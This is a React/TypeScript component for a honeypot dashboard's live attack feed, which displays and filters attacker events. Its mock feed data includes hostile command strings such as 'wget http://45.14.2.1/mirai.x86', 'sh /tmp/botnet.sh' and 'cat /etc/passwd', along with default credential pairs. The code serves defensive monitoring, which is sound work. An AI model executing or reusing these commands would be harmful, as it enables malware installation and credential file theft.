import { AnimatePresence, motion } from 'framer-motion';
import {
  Activity,
  ArrowDownToLine,
  Radio,
  ShieldAlert,
  Terminal as TerminalIcon,
} from 'lucide-react';
import { useEffect, useMemo, useRef, useState } from 'react';
import { Badge } from '../components/ui/badge';
import { Card } from '../components/ui/card';
import { useBackend } from '../lib/backend-context';

type FeedItem = {
  id: string;
  country: string;
  ip: string;
  protocol: string;
  payload: string;
  honeypot: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  time: number;
};

function formatTime(ts: number) {
  const d = new Date(ts);
  return d.toLocaleTimeString('en-GB', { hour12: false });
}

function severityTone(sev: FeedItem['severity']): string {
  switch (sev) {
    case 'critical':
      return 'border-[#FF3D6E]/60 bg-[#FF3D6E]/15 text-[#FF3D6E]';
    case 'high':
      return 'border-orange-500/50 bg-orange-500/10 text-orange-300';
    case 'medium':
      return 'border-amber-400/50 bg-amber-400/10 text-amber-300';
    case 'low':
    default:
      return 'border-emerald-400/50 bg-emerald-400/10 text-emerald-300';
  }
}

const KNOWN_PROTOCOLS = new Set([
  'ssh',
  'telnet',
  'http',
  'https',
  'rtsp',
  'mqtt',
  'modbus',
  'upnp',
]);

const MOCK_FEED_ITEMS: FeedItem[] = [
  {
    id: 'mock-1',
    country: 'RU',
    ip: '185.220.101.5',
    protocol: 'ssh',
    payload: 'root / 123456 (brute_force) -> cat /etc/passwd',
    honeypot: 'ssh-router-trap-02',
    severity: 'high',
    time: Date.now() - 1000 * 60 * 2,
  },
  {
    id: 'mock-2',
    country: 'TH',
    ip: '103.251.140.8',
    protocol: 'ssh',
    payload: 'admin / admin -> uname -a',
    honeypot: 'ssh-router-trap-02',
    severity: 'medium',
    time: Date.now() - 1000 * 60 * 5,
  },
  {
    id: 'mock-3',
    country: 'DE',
    ip: '45.141.87.12',
    protocol: 'rtsp',
    payload: 'CVE-2021-36260 exploit -> /SDK/webLanguage',
    honeypot: 'iot-camera-rtsp-01',
    severity: 'critical',
    time: Date.now() - 1000 * 60 * 8,
  },
  {
    id: 'mock-4',
    country: 'CN',
    ip: '114.119.130.44',
    protocol: 'http',
    payload: 'Mirai/1.0 scanner probe -> /cgi-bin/main-cgi',
    honeypot: 'http-admin-panel-03',
    severity: 'medium',
    time: Date.now() - 1000 * 60 * 12,
  },
  {
    id: 'mock-5',
    country: 'US',
    ip: '198.98.56.9',
    protocol: 'ssh',
    payload: 'support / support -> wget http://45.14.2.1/mirai.x86',
    honeypot: 'ssh-router-trap-02',
    severity: 'high',
    time: Date.now() - 1000 * 60 * 18,
  },
  {
    id: 'mock-6',
    country: 'UA',
    ip: '91.240.118.172',
    protocol: 'ssh',
    payload: 'root / root -> sh /tmp/botnet.sh',
    honeypot: 'ssh-router-trap-02',
    severity: 'critical',
    time: Date.now() - 1000 * 60 * 25,
  },
  {
    id: 'mock-7',
    country: 'BR',
    ip: '177.12.188.90',
    protocol: 'http',
    payload: 'CVE-2020-8515 exploit -> /cgi-bin/rpc',
    honeypot: 'http-admin-panel-03',
    severity: 'high',
    time: Date.now() - 1000 * 60 * 32,
  },
  {
    id: 'mock-8',
    country: 'NL',
    ip: '185.156.177.4',
    protocol: 'mqtt',
    payload: 'Unauthorized subscribe -> sensors/temperature',
    honeypot: 'mqtt-broker-sensor-04',
    severity: 'low',
    time: Date.now() - 1000 * 60 * 45,
  },
];

export function LiveAttackFeed() {
  const { events: backendEvents, status } = useBackend();
  const [feed, setFeed] = useState<FeedItem[]>(MOCK_FEED_ITEMS);
  const containerRef = useRef<HTMLDivElement>(null);
  const [autoScroll, setAutoScroll] = useState(true);
  const [protocolFilter, setProtocolFilter] = useState<'all' | string>('all');
  const [severityFilter, setSeverityFilter] = useState<'all' | FeedItem['severity']>('all');
  const [search, setSearch] = useState('');

  const liveAttacks: FeedItem[] | null = useMemo(() => {
    if (backendEvents === null) return null;
    return backendEvents.slice(0, 20).map((e) => {
      const protocol = KNOWN_PROTOCOLS.has(e.protocol) ? e.protocol : 'other';
      const raw = (e.raw_event ?? {}) as Record<string, unknown>;
      const username = e.username ?? (raw.username as string | undefined);
      const password = e.password ?? (raw.password as string | undefined);
      const command = (raw.command as string | undefined);
      const uri = (raw.uri as string | undefined);
      const path = (raw.path as string | undefined);

      let payloadStr = e.payload_summary || `${e.protocol} event`;
      if (command) {
        payloadStr = command;
      } else if (username) {
        payloadStr = `${username}${password ? ` / ${password}` : ''} (brute_force)`;
      } else if (uri || path) {
        payloadStr = uri ?? path ?? payloadStr;
      }

      const country = (raw.country as string | undefined) ?? 'XX';
      return {
        id: e.id,
        country,
        ip: e.source_ip ?? '0.0.0.0',
        protocol,
        payload: String(payloadStr).slice(0, 120),
        honeypot: e.honeypot_id ?? 'ssh-router-trap-02',
        severity: e.severity ?? 'medium',
        time: new Date(e.timestamp).getTime() || Date.now(),
      };
    });
  }, [backendEvents]);

  // Backend mode: replace feed with live data if available, else mock data
  useEffect(() => {
    if (liveAttacks && liveAttacks.length > 0) {
      setFeed(liveAttacks);
    } else {
      setFeed(MOCK_FEED_ITEMS);
    }
  }, [liveAttacks]);

  // Auto-scroll on new feed entry.
  useEffect(() => {
    if (!autoScroll || !containerRef.current) return;
    containerRef.current.scrollTo({ top: 0, behavior: 'smooth' });
  }, [feed, autoScroll]);

  const sessionCount = feed.length;

  const statusLabel = useMemo(() => {
    if (liveAttacks && liveAttacks.length > 0) return 'Live Feed — Connected';
    if (status === 'offline') return 'Live Feed — Offline (mock telemetry)';
    if (status === 'checking') return 'Live Feed — Connecting…';
    return 'Live Feed — Active Telemetry Feed';
  }, [status, liveAttacks]);

  const statusColor = (liveAttacks && liveAttacks.length > 0)
    ? 'text-[#00FF88]'
    : status === 'offline'
      ? 'text-[#FF3D6E]'
      : 'text-[#00BFFF]';

  const allProtocols = useMemo(() => {
    const set = new Set<string>();
    for (const a of feed) {
      if (a.protocol) set.add(a.protocol);
    }
    return Array.from(set).sort();
  }, [feed]);

  const filteredFeed = useMemo(() => {
    const q = search.trim().toLowerCase();
    return feed.filter((a) => {
      if (protocolFilter !== 'all' && a.protocol !== protocolFilter) return false;
      if (severityFilter !== 'all' && a.severity !== severityFilter) return false;
      if (q) {
        const hay = `${a.ip} ${a.country} ${a.payload} ${a.honeypot}`.toLowerCase();
        if (!hay.includes(q)) return false;
      }
      return true;
    });
  }, [feed, protocolFilter, severityFilter, search]);

  return (
    <section id="feed" className="container py-12 md:py-16">
      <div className="mb-6 flex items-end justify-between gap-4">
        <div>
          <div className="mb-2 inline-flex items-center gap-2 rounded-full border border-[#00BFFF]/40 bg-[#00BFFF]/10 px-3 py-1 text-[10px] font-medium uppercase tracking-[0.18em] text-[#00BFFF]">
            <Radio className="h-3 w-3" /> Live Attack Stream
          </div>
          <h2 className="font-display text-2xl font-semibold tracking-tight text-[#E6F1FF] md:text-3xl">
            Real-Time Attack Telemetry
          </h2>
          <p className="mt-1 flex items-center gap-2 text-sm text-[#8A9BB8]">
            <span className={`h-2 w-2 rounded-full ${statusColor}`} />
            {statusLabel}
            <span className="mx-2 h-3 w-px bg-[#1F2937]" />
            <Activity className="h-3.5 w-3.5 text-[#00BFFF]" /> {sessionCount} active sessions
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setAutoScroll((a) => !a)}
            className={`inline-flex items-center gap-1.5 rounded-md border px-3 py-1.5 text-xs transition ${
              autoScroll
                ? 'border-[#00BFFF]/50 bg-[#00BFFF]/15 text-[#00BFFF]'
                : 'border-[#1F2937] bg-[#0A0F1A]/70 text-[#8A9BB8] hover:border-[#00BFFF]/60'
            }`}
          >
            <ArrowDownToLine className="h-3.5 w-3.5" /> Auto-scroll
          </button>
        </div>
      </div>

      <div className="mb-4 flex flex-wrap items-center gap-3">
        <div className="inline-flex items-center gap-1 rounded-lg border border-[#1F2A44] bg-[#0B0F19] p-1">
          <button
            type="button"
            onClick={() => setProtocolFilter('all')}
            className={
              'rounded-md px-2.5 py-1 text-[10px] font-medium uppercase tracking-wider transition ' +
              (protocolFilter === 'all'
                ? 'bg-[#00BFFF] text-[#03070F] shadow-[0_0_10px_rgba(0,191,255,0.5)]'
                : 'text-[#8A9BB8] hover:text-[#E6F1FF]')
            }
          >
            All protocols
          </button>
          {allProtocols.map((p) => (
            <button
              key={p}
              type="button"
              onClick={() => setProtocolFilter(p)}
              className={
                'rounded-md px-2.5 py-1 text-[10px] font-medium uppercase tracking-wider transition ' +
                (protocolFilter === p
                  ? 'bg-[#00BFFF] text-[#03070F] shadow-[0_0_10px_rgba(0,191,255,0.5)]'
                  : 'text-[#8A9BB8] hover:text-[#E6F1FF]')
              }
            >
              {p}
            </button>
          ))}
        </div>
        <div className="inline-flex items-center gap-1 rounded-lg border border-[#1F2A44] bg-[#0B0F19] p-1">
          {(['all', 'critical', 'high', 'medium', 'low'] as const).map((s) => (
            <button
              key={s}
              type="button"
              onClick={() => setSeverityFilter(s)}
              className={
                'rounded-md px-2.5 py-1 text-[10px] font-medium uppercase tracking-wider transition ' +
                (severityFilter === s
                  ? 'bg-[#FF3D6E] text-[#03070F] shadow-[0_0_10px_rgba(255,61,110,0.5)]'
                  : 'text-[#8A9BB8] hover:text-[#E6F1FF]')
              }
            >
              {s}
            </button>
          ))}
        </div>
        <input
          type="search"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search IP, country, payload…"
          className="min-w-[220px] flex-1 rounded-md border border-[#1F2A44] bg-[#0B0F19] px-3 py-1.5 text-[12px] text-[#E6F1FF] placeholder-[#8A9BB8] focus:border-[#00BFFF]/60 focus:outline-none"
          aria-label="Search live attack feed"
        />
        <p className="text-[10px] uppercase tracking-wider text-[#8A9BB8]">
          Showing {filteredFeed.length} / {feed.length}
        </p>
      </div>

      <Card className="overflow-hidden border-[#00BFFF]/30 bg-[#03070F]/85 shadow-[0_0_30px_rgba(0,191,255,0.18)]">
        <div className="flex items-center justify-between border-b border-[#1F2937]/70 px-4 py-2">
          <div className="flex items-center gap-2">
            <TerminalIcon className="h-4 w-4 text-[#00E5FF]" />
            <span className="text-xs uppercase tracking-widest text-[#8A9BB8]">honeypot@mesh:~$</span>
          </div>
          <div className="flex items-center gap-3 text-[10px] text-[#8A9BB8]">
            <span className="hidden md:inline">PID 4182</span>
            <span>UPTIME 14d 03h</span>
          </div>
        </div>

        <div
          ref={containerRef}
          className="max-h-[440px] overflow-y-auto font-mono text-[13px] leading-relaxed"
        >
          <AnimatePresence initial={false}>
            {filteredFeed.map((a, idx) => (
              <motion.div
                key={a.id}
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
                transition={{ duration: 0.25 }}
                className={`grid grid-cols-12 gap-3 border-b border-[#1F2937]/40 px-4 py-3 transition hover:bg-[#00BFFF]/5 ${
                  idx === 0 ? 'bg-[#00BFFF]/5' : ''
                }`}
              >
                <div className="col-span-12 flex items-center gap-2 text-[#00E5FF] md:col-span-4">
                  <span className="text-base">{countryFlag(a.country)}</span>
                  <span className="font-mono">{a.country}</span>
                  <span className="text-[#8A9BB8]">·</span>
                  <span className="truncate font-mono">{a.ip}</span>
                </div>
                <div className="col-span-6 md:col-span-2">
                  <Badge variant="outline" className="border-[#00BFFF]/50 text-[#00E5FF] uppercase">
                    {a.protocol}
                  </Badge>
                </div>
                <div className="col-span-12 text-[#E6F1FF] md:col-span-4">
                  <div className="truncate">{a.payload}</div>
                  <div className="text-[11px] text-[#8A9BB8]">→ {a.honeypot}</div>
                </div>
                <div className="col-span-12 flex items-center justify-end gap-2 md:col-span-2">
                  <Badge
                    variant="outline"
                    className={`uppercase tracking-wider ${severityTone(a.severity)}`}
                  >
                    <ShieldAlert className="mr-1 h-3 w-3" /> {a.severity}
                  </Badge>
                  <span className="hidden lg:inline text-xs text-[#8A9BB8]">{formatTime(a.time)}</span>
                </div>
              </motion.div>
            ))}
          </AnimatePresence>
          {filteredFeed.length === 0 && (
            <div className="grid place-items-center py-16 text-sm text-[#8A9BB8]">
              {feed.length === 0
                ? 'No live events captured yet.'
                : 'No events match the active filters.'}
            </div>
          )}
        </div>
      </Card>
    </section>
  );
}

const COUNTRY_FLAG: Record<string, string> = {
  US: '🇺🇸', CN: '🇨🇳', RU: '🇷🇺', DE: '🇩🇪', BR: '🇧🇷', NG: '🇳🇬',
  IN: '🇮🇳', IR: '🇮🇷', KP: '🇰🇵', VN: '🇻🇳', TR: '🇹🇷', MX: '🇲🇽',
  EG: '🇪🇬', ZA: '🇿🇦', ID: '🇮🇩', PH: '🇵🇭', PL: '🇵🇱', UA: '🇺🇦',
  GB: '🇬🇧', FR: '🇫🇷', IT: '🇮🇹', ES: '🇪🇸', NL: '🇳🇱', CA: '🇨🇦',
  XX: '🌐',
};

function countryFlag(iso: string | undefined): string {
  if (!iso) return '🌐';
  return COUNTRY_FLAG[iso.toUpperCase()] ?? '🌐';
}